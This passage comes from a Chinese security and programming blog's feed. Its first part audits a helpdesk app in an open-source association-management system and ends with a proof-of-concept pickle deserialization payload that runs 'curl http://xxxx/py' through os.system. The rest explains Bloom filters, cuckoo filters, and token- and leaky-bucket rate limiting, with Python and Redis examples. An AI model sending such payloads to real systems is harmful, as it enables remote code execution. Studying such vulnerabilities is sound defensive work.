class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面代码看出，这是一个从views中获取参数<code>saved_query</code>，通过id判断请求的用户和数据所属用户身份，正确后反序列化其中的query值，那么这个数据库是如下，保存的是一个文本字段。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SavedSearch</span><span class="token punctuation">(</span>models<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>query <span class="token operator">=</span> models<span class="token punctuation">.</span>TextField<span class="token punctuation">(</span>        _<span class="token punctuation">(</span><span class="token string">'Search Query'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        help_text<span class="token operator">=</span>_<span class="token punctuation">(</span><span class="token string">'Pickled query object. Be wary changing this.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如何去处理这个字段的值，在上个文件中，找到保存的处理方法。从post中获取<code>query_encoded</code>，判断不为空则直接保存进数据库。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">save_query</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    title <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    shared <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'shared'</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'on'</span><span class="token punctuation">,</span> <span class="token string">'True'</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token string">'TRUE'</span><span class="token punctuation">]</span>    query_encoded <span class="token operator">=</span> request<span class="token punctuation">.</span>POST<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'query_encoded'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> title <span class="token keyword">or</span> <span class="token keyword">not</span> query_encoded<span class="token punctuation">:</span>        <span class="token keyword">return</span> HttpResponseRedirect<span class="token punctuation">(</span>reverse<span class="token punctuation">(</span><span class="token string">'helpdesk_list'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    query <span class="token operator">=</span> SavedSearch<span class="token punctuation">(</span>title<span class="token operator">=</span>title<span class="token punctuation">,</span> shared<span class="token operator">=</span>shared<span class="token punctuation">,</span> query<span class="token operator">=</span>query_encoded<span class="token punctuation">,</span> user<span class="token operator">=</span>request<span class="token punctuation">.</span>user<span class="token punctuation">)</span>    query<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么如何调用的，同样去搜索关键词<code>save_query</code>找到路由，找到对应的name为<code>helpdesk_savequery</code>，找到对应的前端表单</p><pre class="line-numbers language-none"><code class="language-none">&lt;form method&#x3D;&#39;post&#39; action&#x3D;&#39;&#123;% url &#39;helpdesk_savequery&#39; %&#125;&#39;&gt;    &lt;input type&#x3D;&#39;hidden&#39; name&#x3D;&#39;query_encoded&#39; value&#x3D;&#39;&#123;&#123; urlsafe_query &#125;&#125;&#39; &#x2F;&gt;    &lt;dl&gt;        &lt;dt&gt;&lt;label for&#x3D;&#39;id_title&#39;&gt;&#123;% trans &quot;Query Name&quot; %&#125;&lt;&#x2F;label&gt;&lt;&#x2F;dt&gt;        &lt;dd&gt;&lt;input type&#x3D;&#39;text&#39; name&#x3D;&#39;title&#39; id&#x3D;&#39;id_title&#39; &#x2F;&gt;&lt;&#x2F;dd&gt;        &lt;dd class&#x3D;&#39;form_help_text&#39;&gt;&#123;% trans &quot;This name appears in the drop-down list of saved queries. If you share your query, other users will see this name, so choose something clear and descriptive!&quot; %&#125;&lt;&#x2F;dd&gt;        &lt;dt&gt;&lt;label for&#x3D;&#39;id_shared&#39;&gt;&#123;% trans &quot;Shared?&quot; %&#125;&lt;&#x2F;label&gt;&lt;&#x2F;dt&gt;        &lt;dd&gt;&lt;input type&#x3D;&#39;checkbox&#39; name&#x3D;&#39;shared&#39; id&#x3D;&#39;id_shared&#39; &#x2F;&gt; &#123;% trans &quot;Yes, share this query with other users.&quot; %&#125;&lt;&#x2F;dd&gt;        &lt;dd class&#x3D;&#39;form_help_text&#39;&gt;&#123;% trans &quot;If you share this query, it will be visible by &lt;em&gt;all&lt;&#x2F;em&gt; other logged-in users.&quot; %&#125;&lt;&#x2F;dd&gt;    &lt;&#x2F;dl&gt;    &lt;div class&#x3D;&#39;buttons&#39;&gt;        &lt;input class&#x3D;&quot;btn btn-primary&quot; type&#x3D;&#39;submit&#39; value&#x3D;&#39;&#123;% trans &quot;Save Query&quot; %&#125;&#39;&gt;    &lt;&#x2F;div&gt;    &#123;% csrf_token %&#125;&lt;&#x2F;form&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从表单中可以看到，<code>query_encoded</code>是模板写入，找到<code>urlsafe_query</code>看是如何调用的，从调用结果看，就知道是后台先去序列化然后赋值给模板，前端模板操作的时候，再把这个序列化的值传入后台中去反序列化。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">import</span> pickle    <span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode    urlsafe_query <span class="token operator">=</span> b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>query_params<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>尝试构造一个反序列化的poc</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token punctuation">,</span>os<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64encode<span class="token keyword">class</span> <span class="token class-name">exp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'curl http://xxxx/py'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>e <span class="token operator">=</span> exp<span class="token punctuation">(</span><span class="token punctuation">)</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;反序列化&quot;&gt;&lt;a href=&quot;#反序列化&quot; class=&quot;headerlink&quot; title=&quot;反序列化&quot;&gt;&lt;/a&gt;反序列化&lt;/h4&gt;&lt;p&gt;来自一个开源协会管理系统，文件&lt;code&gt;tendenci\apps\helpdesk\views\staff.py&lt;/co
      
    
    </summary>
    
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python 过滤器</title>
    <link href="https://misakikata.github.io/2020/05/Python-%E8%BF%87%E6%BB%A4%E5%99%A8/"/>
    <id>https://misakikata.github.io/2020/05/Python-过滤器/</id>
    <published>2020-05-27T08:08:24.000Z</published>
    <updated>2020-05-27T08:11:28.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="布隆过滤器"><a href="#布隆过滤器" class="headerlink" title="布隆过滤器"></a>布隆过滤器</h2><h3 id="什么是布隆过滤器？"><a href="#什么是布隆过滤器？" class="headerlink" title="什么是布隆过滤器？"></a>什么是布隆过滤器？</h3><p>本质上布隆过滤器( BloomFilter )是一种数据结构，比较巧妙的概率型数据结构（probabilistic data structure），特点是高效地插入和查询，可以用来告诉你 “某样东西一定不存在或者可能存在”。</p><p>相比于传统的 Set、Map 等数据结构，它更高效、占用空间更少，但是缺点是其返回的结果是概率性的，而不是确切的。</p><h3 id="布隆过滤器原理"><a href="#布隆过滤器原理" class="headerlink" title="布隆过滤器原理"></a>布隆过滤器原理</h3><p>布隆过滤器内部维护一个<code>bitArray</code>(位数组)， 开始所有数据全部置 0 。当一个元素过来时，能过多个哈希函数（hash1,hash2,hash3….）计算不同的在哈希值，并通过哈希值找到对应的<code>bitArray</code>下标处，将里面的值 0 置为 1 。 需要说明的是，布隆过滤器有一个误判率的概念，误判率越低，则数组越长，所占空间越大。误判率越高则数组越小，所占的空间越小。</p><p>下面以网址为例来进行说明, 例如布隆过滤器的初始情况如下图所示：<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205013684-856617678.jpg" alt="img"></p><p>现在我们需要往布隆过滤里中插入<code>baidu</code>这个url，经过3个哈希函数的计算，hash值分别为1，4，7，那么我们就需要对布隆过滤器的对应的bit位置1， 就如图下所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205051490-438287903.jpg" alt="img"></p><p>接下来，需要继续往布隆过滤器中添加<code>tencent</code>这个url，然后它计算出来的hash值分别3，4，8，继续往对应的bit位置1。这里就需要注意一个点， 上面两个url最后计算出来的hash值都有4，这个现象也是布隆不能确认某个元素一定存在的原因，最后如下图所示：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1534894-20191207205113779-698386268.jpg" alt="img"></p><p>布隆过滤器的查询也很简单，例如我们需要查找<code>python</code>，只需要计算出它的hash值， 如果该值为2，4，7，那么因为对应bit位上的数据有一个不为1， 那么一定可以断言<code>python</code>不存在，但是如果它计算的hash值是1，3，7，那么就只能判断出<code>python</code>可能存在，这个例子就可以看出来， 我们没有存入<code>python</code>，但是由于其他key存储的时候返回的hash值正好将<code>python</code>计算出来的hash值对应的bit位占用了，这样就不能准确地判断出<code>python</code>是否存在。</p><p>因此， 随着添加的值越来越多， 被占的bit位越来越多， 这时候误判的可能性就开始变高，如果布隆过滤器所有bit位都被置为1的话，那么所有key都有可能存在， 这时候布隆过滤器也就失去了过滤的功能。至此，选择一个合适的过滤器长度就显得非常重要。</p><p>从上面布隆过滤器的实现原理可以看出，它不支持删除， 一旦将某个key对应的bit位置0，可能会导致同样bit位的其他key的存在性判断错误。</p><h3 id="如何在python中使用布隆过滤器"><a href="#如何在python中使用布隆过滤器" class="headerlink" title="如何在python中使用布隆过滤器"></a>如何在python中使用布隆过滤器</h3><ol><li><p>先去这个网站下载<code>bitarray</code>这个依赖 <code>https://www.lfd.uci.edu/~gohlke/pythonlibs/#bitarray</code></p><p> 直接安装会报错<code>error: Microsoft Visual C++ 14.0 is required. Get it with &quot;Build Tools for Visual Studio&quot;: https://visualstudio.microsoft.com/downloads/</code></p></li><li><p> 安装<code>wheel</code>文件, 防止我们主动安装报这样的错误<code>pip3 install bitarray-1.1.0-cp36-cp36m-win_amd64.whl</code></p></li><li><p> <code>pip3 install pybloom_live</code></p></li></ol><p>该模块包含两个类实现布隆过滤器功能。<code>BloomFilter</code> 是定容。<code>ScalableBloomFilter</code> 可以自动扩容</p><pre class="line-numbers language-none"><code class="language-none">import pybloom_livebloom &#x3D; pybloom_live.BloomFilter(capacity&#x3D;10000)  #定容一万for i in range(0, 10001):    bloom.add(i)print(len(bloom))bloom.add(10002)bloom.add(10003)print(len(bloom))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当超过一万时，会提示一个越界提示，<code>IndexError: BloomFilter is at capacity</code>。看起来好像不如自动扩容的好用。对比一下定容数量和扩容数量的差别。</p><p>误判率默认是设置为千分之一，按照默认的误判率来做对比，当数量在定容内，误判率远低于设置的误判率，但数量超过定容时，准确度基本按照设置的误判率来控制。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200507094915132.png" alt="image-20200507094915132"></p><p>如果需要自动扩容来处理不确定的数量差别，可以使用<code>error_rate</code>来控制误判率。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200507095303352.png" alt="image-20200507095303352"></p><h3 id="redis-使用"><a href="#redis-使用" class="headerlink" title="redis 使用"></a>redis 使用</h3><p>docker拉取redis环境</p><pre class="line-numbers language-none"><code class="language-none">docker run -p 6379:6379 --name redis-redisbloom redislabs&#x2F;rebloom:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建一个新过滤器</p><pre class="line-numbers language-none"><code class="language-none">106.54.181.x:6379&gt; bf.reserve newbloom 0.001 10000OK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>添加一个新的值，存在返回0，不存在会返回1</p><pre class="line-numbers language-none"><code class="language-none">106.54.181.x:6379&gt; bf.add name 1111(integer) 1106.54.181.x:6379&gt; bf.add name 1111(integer) 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>判断值是否存在，不存在返回0，存在返回1。</p><pre class="line-numbers language-none"><code class="language-none">106.54.181.x:6379&gt; bf.exists name 1111(integer) 1106.54.181.x:6379&gt; bf.exists name 2222(integer) 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>添加多个新的值</p><pre class="line-numbers language-none"><code class="language-none">106.54.181.187:6379&gt; bf.madd name 2222  33331) (integer) 12) (integer) 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用<a href="https://github.com/RedisBloom/redisbloom-py%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%B7%BB%E5%8A%A0%E8%84%9A%E6%9C%AC">https://github.com/RedisBloom/redisbloom-py编写一个简单的添加脚本</a></p><pre class="line-numbers language-none"><code class="language-none">from redisbloom.client import Clientclass _redis_bloom(object):    def __init__(self, size, error&#x3D;0.001, key&#x3D;&#39;name&#39;):        self.size &#x3D; size        self.error &#x3D; error        self.key &#x3D; key        self.rb &#x3D; Client(host&#x3D;&#39;106.54.181.x&#39;, port&#x3D;6379)        self.rb.bfCreate(self.size, self.error, self.key)        self.rb.delete(key)    def insert(self, name):        if self.rb.bfExists(self.key, name) &#x3D;&#x3D; 0:            self.rb.bfAdd(self.key, name)            return True        else:            return Falserd &#x3D; _redis_bloom(size&#x3D;10000)for i in range(0, 5000):    rd.insert(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="布谷鸟过滤器"><a href="#布谷鸟过滤器" class="headerlink" title="布谷鸟过滤器"></a>布谷鸟过滤器</h2><h3 id="布谷鸟过滤器-1"><a href="#布谷鸟过滤器-1" class="headerlink" title="布谷鸟过滤器"></a>布谷鸟过滤器</h3><p>布谷过滤器(cuckoo fliter)，这个名字来源于更早发表的布谷散列(cuckoo hash)，为了解决布隆过滤器不能删除的问题而出现。</p><p>采用一部分示意图说明布谷散列</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo0.png" alt="image"></p><p>现在我们假设有一些项要存入散列表，其每个项都有其对应的两个位置，先插入第一项A</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_A.png" alt="image"></p><p>由于插入A的时候其两个候选位置（0,2）都没有占用，所以选择第一张表或者是第二张表都可以，我们在这里默认先选择第一张表，然后插入第二项B<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_B.png" alt="image"></p><p>我们看到原来的A的位置被B占用，而A被“踢”到它的备选位置表二的2号位置上了，这就是当发生位置冲突时，布谷散列表的处理逻辑，后来的数据项将会把之前占用的项踢到另一个位置上。我们接下来插入第三项C</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_C.png" alt="image"><br>没有冲突，顺利搞定，接着插入D</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/cuckoo_D.png" alt="image"><br>D成功的把C踢走了，其实看到这里读者应该在猜想，会不会有一种情况，即被踢走的数据的另一个备选位置也被占用了，这样怎么办？答案是继续踢，一个踢一个，直到大家都找到自己合适的归宿为止。</p><h3 id="布谷鸟过滤器的问题"><a href="#布谷鸟过滤器的问题" class="headerlink" title="布谷鸟过滤器的问题"></a>布谷鸟过滤器的问题</h3><p>从上面看出来，布谷鸟过滤器会让数据不停的找自己的位置，这样就会达到一个循环，比如表一某个数踢走一个到表二，表二中的数又踢走一个表一，这样会不停的循环影响效率。所以这时候布谷鸟过滤器就有一个阈值，当超过这个阈值就会说明过滤器数组满了。需要扩容，而实际并不一定满。</p><p>因为上面只设置了两个巢，所以空间利用率比较低，可能也就百分之五十左右。这时候就需要改进算法， 比如不再设置两个巢，而是较多的巢来保证可以将循环降低。</p><p>随着布谷鸟过滤器的装满，插入将变得缓慢，因为需要踢走更多的物品。如果程序对插入时间很敏感，布谷鸟过滤器并不一定适合。</p><p>另外还有一个明显的问题就是，如果插入一个数据插入了多次，就会产生自己踢自己的结果，将导致几个位置上都是同一个数据，不止如此还会提早的达到数组阈值。导致空间利用率底下。也许可以使用一次查询来解决此问题。</p><p>但是删除的时候会出现一定概率的误删。因为不同的元素被 hash 到同一个位置的可能性还是很大的，而且指纹只有一个字节，256 种可能，同一个位置出现相同的指纹可能性也很大。如果两个元素的 hash 位置相同，指纹相同，那么这个插入检查会认为它们是相等的。</p><h3 id="python实现布谷鸟过滤器"><a href="#python实现布谷鸟过滤器" class="headerlink" title="python实现布谷鸟过滤器"></a>python实现布谷鸟过滤器</h3><pre class="line-numbers language-none"><code class="language-none">pip install cuckoopy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">from cuckoopy import CuckooFilterck &#x3D; CuckooFilter(capacity&#x3D;1000, bucket_size&#x3D;4, fingerprint_size&#x3D;1)   #每个位置四个座位，指纹字节长度为1ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)ck.insert(&#39;hello&#39;)print(ck.contains(&#39;hello&#39;), ck.size)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种情况下，当插入同一个数据超过八次的时候，由于两个桶的八个座位都被一个数据占用，会出现循环踢的情况，超过阈值导致认为数据桶一件满了。</p><pre class="line-numbers language-none"><code class="language-none">cuckoopy.exceptions.CuckooFilterFullException: Insert operation failed. Filter is full.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>所以在使用布谷鸟过滤器的时候，需要先进行一次查询，如果数据存在则不在进行插入。</p><pre class="line-numbers language-none"><code class="language-none">from cuckoopy import CuckooFilterck &#x3D; CuckooFilter(capacity&#x3D;1000, bucket_size&#x3D;4, fingerprint_size&#x3D;1)   #每个位置四个座位，指纹字节长度为1ck.insert(&#39;hello&#39;)if not ck.contains(&#39;hello&#39;):    ck.insert(&#39;hello&#39;)else:    print(&quot;数据重复！&quot;)print(ck.contains(&#39;hello&#39;), ck.size)  #数据重复！ True 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="redis-使用-1"><a href="#redis-使用-1" class="headerlink" title="redis 使用"></a>redis 使用</h3><p>使用方式跟布隆过滤器基本一致，需要把bf改为cf即可</p><pre class="line-numbers language-none"><code class="language-none">CF.RESERVE newCuckooFilter 1000  #新建一个过滤器CF.ADD newCuckooFilter foo  #增加一个值CF.EXISTS newCuckooFilter foo  #判断是否存在CF.DEL newCuckooFilter foo  #删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>同样使用上面的脚本</p><pre class="line-numbers language-none"><code class="language-none">from redisbloom.client import Clientclass _redis_cuckoo(object):    def __init__(self, size, key&#x3D;&#39;name&#39;):        self.size &#x3D; size        self.key &#x3D; key        self.rb &#x3D; Client(host&#x3D;&#39;106.54.181.x&#39;, port&#x3D;6379)        self.rb.cfCreate(self.key,self.size)    def insert(self, name):        if self.rb.cfExists(self.key, name) &#x3D;&#x3D; 0:            self.rb.cfAdd(self.key, name)            return True        else:            return Falserd &#x3D; _redis_cuckoo(size&#x3D;10000)for i in range(0, 5000):    rd.insert(i)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="令牌桶算法"><a href="#令牌桶算法" class="headerlink" title="令牌桶算法"></a>令牌桶算法</h2><p>令牌桶算法是网络流量整形（Traffic Shaping）和速率限制（Rate Limiting）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。</p><p>实现代码：<a href="https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py">https://github.com/titan-web/rate-limit/blob/master/token_bucket/__init__.py</a></p><pre class="line-numbers language-none"><code class="language-none">import timefrom threading import RLock__all__ &#x3D; (&quot;TokenBucket&quot;, )class TokenBucket(object):    def __init__(self, capacity, fill_rate, is_lock&#x3D;False):        &quot;&quot;&quot;        :param capacity:  The total tokens in the bucket.        :param fill_rate:  The rate in tokens&#x2F;second that the bucket will be refilled        &quot;&quot;&quot;        self._capacity &#x3D; float(capacity)        self._tokens &#x3D; float(capacity)        self._fill_rate &#x3D; float(fill_rate)        self._last_time &#x3D; time.time()        self._is_lock &#x3D; is_lock        self._lock &#x3D; RLock()    def _get_cur_tokens(self):        if self._tokens &lt; self._capacity:            now &#x3D; time.time()            delta &#x3D; self._fill_rate * (now - self._last_time)  # 计算从上次发送到这次发送，新发放的令牌数量            self._tokens &#x3D; min(self._capacity, self._tokens + delta) # 令牌数量不能超过桶的容量            self._last_time &#x3D; now        return self._tokens    def get_cur_tokens(self):        if self._is_lock:            with self._lock:                return self._get_cur_tokens()        else:            return self._get_cur_tokens()    def _consume(self, tokens):        if tokens &lt;&#x3D; self.get_cur_tokens():  # 如果没有足够的令牌，则不能发送数据            self._tokens -&#x3D; tokens            return True        return False    def consume(self, tokens):    #发送数据需要的令牌        if self._is_lock:            with self._lock:                return self._consume(tokens)        else:            return self._consume(tokens)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用的方式是传入需要的令牌数，比如</p><pre class="line-numbers language-none"><code class="language-none">tk &#x3D; TokenBucket(capacity&#x3D;10, fill_rate&#x3D;10)  #容量10，每秒10个令牌while True:    if tk.consume(1):        print(&#39;1111&#39;)    else:        print(&#39;2222&#39;)        time.sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>会显示如下：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20200508164220582.png" alt="image-20200508164220582"></p><p>当桶内令牌又新增的时候会继续发送。</p><h2 id="漏桶算法"><a href="#漏桶算法" class="headerlink" title="漏桶算法"></a>漏桶算法</h2><p>漏桶算法(Leaky Bucket)它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶可以看作是一个带有常量服务时间的单服务器队列，如果漏桶（包缓存）溢出，那么数据包会被丢弃。 在网络中，漏桶算法可以控制端口的流量输出速率，平滑网络上的突发流量，实现流量整形，从而为网络提供一个稳定的流量。</p><p>实现代码：<a href="https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py">https://github.com/titan-web/rate-limit/blob/master/leaky_bucket/__init__.py</a></p><pre class="line-numbers language-none"><code class="language-none">from time import time, sleepfrom threading import RLock__all__ &#x3D; (&quot;LeakyBucket&quot;, )class LeakyBucket(object):    def __init__(self, capacity, leak_rate, is_lock&#x3D;False):        &quot;&quot;&quot;        :param capacity:  The total tokens in the bucket.        :param leak_rate:  The rate in tokens&#x2F;second that the bucket leaks        &quot;&quot;&quot;        self._capacity &#x3D; float(capacity)        self._used_tokens &#x3D; 0        self._leak_rate &#x3D; float(leak_rate)        self._last_time &#x3D; time()        self._lock &#x3D; RLock() if is_lock else None    def get_used_tokens(self):        if self._lock:            with self._lock:                return self._get_used_tokens()        else:            return self._get_used_tokens()    def _get_used_tokens(self):        now &#x3D; time()        delta &#x3D; self._leak_rate * (now - self._last_time)     #间隔时间新泄露的漏桶令牌数        self._used_tokens &#x3D; max(0, self._used_tokens - delta)   #获取数不超过漏桶最大容量        return self._used_tokens    def _consume(self, tokens):        if tokens + self._get_used_tokens() &lt;&#x3D; self._capacity:  #小于桶容量继续存储            self._used_tokens +&#x3D; tokens            self._last_time &#x3D; time()            return True        return False    def consume(self, tokens):    #发送数据需要的令牌        if self._lock:            with self._lock:                return self._consume(tokens)        else:            return self._consume(tokens)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用类似如上的方法调用</p><pre class="line-numbers language-none"><code class="language-none">ck &#x3D; LeakyBucket(capacity&#x3D;20, leak_rate&#x3D;5)   #桶容量20，每秒泄露5while True:    if ck.consume(1):        print(&#39;1111&#39;)    else:        print(&#39;2222&#39;)        sleep(1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果首先把桶内的泄露完，此后每秒泄露五个。如果修改泄露数为30，这样结果任然是最多20个泄露。</p><p>参考文章：<a href="https://www.cnblogs.com/yscl/p/12003359.html">https://www.cnblogs.com/yscl/p/12003359.html</a></p><p>​                        <a href="https://www.cnblogs.com/chuxiuhong/p/8215719.html">https://www.cnblogs.com/chuxiuhong/p/8215719.html</a></p><p>​                        <a href="https://zhuanlan.zhihu.com/p/68418134">https://zhuanlan.zhihu.com/p/68418134</a></p><p>​                        <a href="https://www.jianshu.com/p/c02899c30bbd">https://www.jianshu.com/p/c02899c30bbd</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;布隆过滤器&quot;&gt;&lt;a href=&quot;#布隆过滤器&quot; class=&quot;headerlink&quot; title=&quot;布隆过滤器&quot;&gt;&lt;/a&gt;布隆过滤器&lt;/h2&gt;&lt;h3 id=&quot;什么是布隆过滤器？&quot;&gt;&lt;a href=&quot;#什么是布隆过滤器？&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="python" scheme="https://misakikata.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 反序列化</title>
    <link href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://misakikata.github.io/2020/04/python-反序列化/</id>
    <published>2020-04-26T07:11:44.000Z</published>
    <updated>2020-05-26T08:49:23.000Z</updated>
    
